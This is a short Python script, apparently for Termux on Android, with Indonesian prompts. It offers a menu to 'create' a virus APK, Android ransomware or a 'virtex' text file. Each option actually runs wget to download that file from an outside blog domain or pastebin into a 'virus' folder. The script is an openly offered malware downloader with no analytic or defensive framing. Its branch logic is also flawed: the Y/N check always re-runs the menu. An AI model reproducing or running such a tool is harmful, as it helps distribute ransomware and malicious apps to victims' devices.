import os,sys

try:
    import wget
except ImportError:
    os.system('pkg install wget')
def main():
    try:
        os.mkdir('virus')
    except OSError: # GITHUB.COM/AZURA-X
        pass       # JANGAN DI GANTI NANTI ERROR !
    print('[1] Virus apk')
    print('[2] AndroidRansomware')
    print('[3] Virus.txt (virtex)')
    w = input ('pilih:')
    if '1' in w:
        print('sedang membuat...')
        os.system('cd virus;wget http://loolzec.blogwaper.com/files/b.apk')
        print('Tersimpan di ~> /virus/b.apk')
        a = input ('ingin membuat lagi? [Y/N]')
        if 'Y' or 'y' in a:
            main()
        elif 'N' or 'n' in a:
            print('bye anjing!')
            os.sys.exit()
        else:
            print('command not found!')
            os.sys.exit()
    elif '2' in w:
        print('sedang membuat...')
        os.system('cd virus; wget http://loolzec.blogwaper.com/files/androidransomware.zip')
        print('Tersimpan di ~> /virus/androidransomware.zip')
        b = input ('ingin membuat lagi [Y/N]')
        if b=='y' or b=='Y':
            main()
        elif b=='n' or b=='N':
            print('bye anjing!')
        else:
            print('command not found !')
            os.sys.exit()
    elif '3' in w: #Coded by Aleeju
        print('sedang membuat...')
        os.system('cd virus;wget https://pastebin.com/raw/QsL0vXbQ')
        print('tersimpan di ~> /virus/QsL0vXbQ')
    else:
        print('command not found!')
        os.sys.exit()

if __name__=='__main__':
    main()